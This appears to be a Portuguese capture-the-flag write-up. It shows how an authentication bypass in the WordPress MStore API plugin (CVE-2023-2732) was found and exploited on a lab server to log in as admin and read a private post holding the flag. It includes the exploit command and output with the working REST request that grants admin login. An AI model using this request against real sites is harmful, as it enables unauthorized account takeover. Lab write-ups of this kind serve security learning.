# CTF Semana #3 (Wordpress CVE)

## Desafio 1

Numa primeira fase de reconhecimento, recolheu-se a informação abaixo ao navegar pela aplicação web, que pode ser importante para encontrar e explorar vunerabilidades.

- Versão do WordPress 5.8.1
- Plugins instalados: 
    - MStore API 3.9.0
    - WooCommerce plugin 5.7.1
    - Booster for WooCommerce plugin 5.4.4
- Possíveis utilizadores:
    - admin
    - Orval Sanford

Utilizando esta informação e tendo em vista o objetivo de identificar uma CVE que permita fazer login como outro utilizador, verificou-se a existência de uma vulnerabilidade na versão 3.9.0 do plugin `MStore API`. Trata-se da [CVE-2023-2732](https://nvd.nist.gov/vuln/detail/CVE-2023-2732) - "The MStore API plugin for WordPress is vulnerable to authentication bypass in versions up to, and including, 3.9.2. This is due to insufficient verification on the user being supplied during the add listing REST API request through the plugin. This makes it possible for unauthenticated attackers to log in as any existing user on the site, such as an administrator, if they have access to the user id."

## Desafio 2

Durante a pesquisa de um exploit, encontrou-se [este](https://github.com/RandomRobbieBF/CVE-2023-2732) repositório GitHub onde existe um programa automático que permite explorar a CVE-2023-2732. Seguindo as instruções de utilização, através do comando `python3 mstore-api.py -u http://143.47.40.175:5001`, o programa verificou que a versão do plugin era inferior a 3.9.3 (3.9.0 no caso) e a existência do utilizador `admin`, tal como já tinha sido identificado na fase de reconhecimento. O resultado foi 2 links que permitiram o acesso ao servidor como admin.

``` bash
dgs@Daniels-MacBook-Pro Downloads % python3 mstore-api.py -u http://143.47.40.175:5001
The plugin version is below 3.9.3.
Select a user:
1. admin
Enter the user ID: 1



Congratulations a vulnerable system has been found.

How to Exploit:

Visit the following url: http://143.47.40.175:5001/wp-json/wp/v2/add-listing?id=1
Visit  http://143.47.40.175:5001 and you should be logged in as the user you have chosen.
```

Depois de entrar na página de administração do site WordPress, encontrou-se um post privado com o título "Message to our employees" com a flag.

![](./images/ctf3.png)